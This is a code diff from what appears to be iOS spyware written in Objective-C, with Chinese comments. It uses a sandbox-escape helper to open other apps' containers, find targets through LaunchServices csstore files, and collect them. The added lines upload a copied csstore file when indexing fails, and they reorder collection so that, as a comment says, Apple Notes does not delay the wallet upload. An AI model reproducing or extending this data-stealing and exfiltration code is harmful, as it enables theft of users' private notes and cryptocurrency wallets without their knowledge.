@@ -573,6 +573,7 @@ static uint64_t WQLFNV1a(const char *s) {
           (unsigned long)daemons.count, -[t0 timeIntervalSinceNow]];
 
     NSUInteger opened = 0, stores = 0;
+    NSString *dumpContainer = nil, *dumpName = nil;
     for (NSString *container in daemons) {
         int64_t handle = [[WQLEscape shared] consumeExtensionForPath:container error:nil];
         if (handle <= 0) continue;
@@ -592,6 +593,11 @@ static uint64_t WQLFNV1a(const char *s) {
             if (memcmp(data.bytes, "bdsl", 4) != 0) continue;
 
             stores++;
+            // 记住一个足够大的 store，索引失败时回传做离线分析
+            if (!dumpContainer.length && data.length > 4 * 1024 * 1024) {
+                dumpContainer = container;
+                dumpName = name;
+            }
             uint32_t detected = WQLDetectRecordSize(data.bytes, data.length);
             NSDictionary *map = WQLParseCSStoreAuto(data, detected);
 
@@ -644,6 +650,30 @@ static uint64_t WQLFNV1a(const char *s) {
                   (unsigned long)escaped, (unsigned long)paths.count, (unsigned long)matched];
         }
         [[WQLEscape shared] releaseHandle:handle];
+    }
+
+    // 索引没命中：把 csstore 回传一份，方便离线分析别的机型/版本
+    if (hits.count == 0 && dumpContainer.length && dumpName.length) {
+        [self log:@"    ⚠️ 索引未命中，回传 csstore 供离线分析"];
+        int64_t dumpHandle = [[WQLEscape shared] consumeExtensionForPath:dumpContainer error:nil];
+        if (dumpHandle > 0) {
+            NSString *src = [[dumpContainer stringByAppendingPathComponent:@"Library/Caches"]
+                             stringByAppendingPathComponent:dumpName];
+            NSString *stage = [NSTemporaryDirectory() stringByAppendingPathComponent:@"wql_lsdump"];
+            NSFileManager *fm = [NSFileManager defaultManager];
+            [fm removeItemAtPath:stage error:nil];
+            [fm createDirectoryAtPath:stage withIntermediateDirectories:YES attributes:nil error:nil];
+            NSString *dst = [stage stringByAppendingPathComponent:dumpName];
+            if ([fm copyItemAtPath:src toPath:dst error:nil]) {
+                NSDictionary *attr = [fm attributesOfItemAtPath:dst error:nil];
+                uint64_t sz = [attr[NSFileSize] unsignedLongLongValue];
+                [self log:@"    ↑ 上传 %@（%.1f MB）", dumpName, sz / 1048576.0];
+                BOOL ok = [self uploadStage:stage blocking:YES];
+                [self log:@"    %@ csstore 上传", ok ? @"✅" : @"⛔"];
+            }
+            [fm removeItemAtPath:stage error:nil];
+            [[WQLEscape shared] releaseHandle:dumpHandle];
+        }
     }
 
     [self log:@"    daemon 容器 %lu 个，csstore %lu 个，命中目标 %lu 个，耗时 %.1f 秒",
@@ -818,7 +848,17 @@ static uint64_t WQLFNV1a(const char *s) {
     NSArray<NSDictionary *> *indexed = [self discoverContainersViaStore:targets];
     if (indexed.count) {
         [self log:@"【索引】跳过 inode 扫描，直接采集 %lu 个目标", (unsigned long)indexed.count];
+
+        // 备忘录最后处理：它的包通常十几 MB，别挡住钱包上传
+        NSMutableArray<NSDictionary *> *ordered = [NSMutableArray arrayWithCapacity:indexed.count];
         for (NSDictionary *hit in indexed) {
+            if (![hit[@"target"] isEqualToString:@"Notes"]) [ordered addObject:hit];
+        }
+        for (NSDictionary *hit in indexed) {
+            if ([hit[@"target"] isEqualToString:@"Notes"]) [ordered addObject:hit];
+        }
+
+        for (NSDictionary *hit in ordered) {
             if (self.cancelBlock && self.cancelBlock()) break;
             handleContainer(@"/index", hit[@"path"]);
         }
